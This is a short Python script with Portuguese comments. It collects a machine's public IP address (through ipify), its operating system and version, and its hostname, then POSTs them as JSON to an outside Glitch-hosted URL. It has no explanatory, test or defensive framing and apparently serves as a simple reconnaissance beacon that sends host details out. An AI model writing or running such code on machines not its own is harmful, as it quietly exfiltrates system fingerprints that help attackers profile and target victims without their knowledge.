import requests
import platform
import socket

# Coleta de dados
def collect_data():
    data = {}
    
    # Coletar IP público
    try:
        public_ip = requests.get('https://api.ipify.org').text
        data['ip'] = public_ip
    except:
        data['ip'] = "Não encontrado"
    
    # Coletar informações do sistema operacional
    data['os'] = platform.system() + " " + platform.release()
    
    # Coletar nome do host (pode fornecer mais contextos em alguns casos)
    data['hostname'] = socket.gethostname()
    
    return data

# Enviar dados para o servidor
def send_data(data):
    SERVER_URL = "https://pastoral-synonymous-green.glitch.me/dados"  # Substituído pela sua URL do Glitch
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(SERVER_URL, json=data, headers=headers, timeout=10)
        if response.status_code == 200:
            print("Dados enviados com sucesso!")
        else:
            print(f"Erro ao enviar dados! Código: {response.status_code}")
    except requests.RequestException as e:
        print(f"Erro de rede: {e}")

if __name__ == "__main__":
    data = collect_data()
    send_data(data)
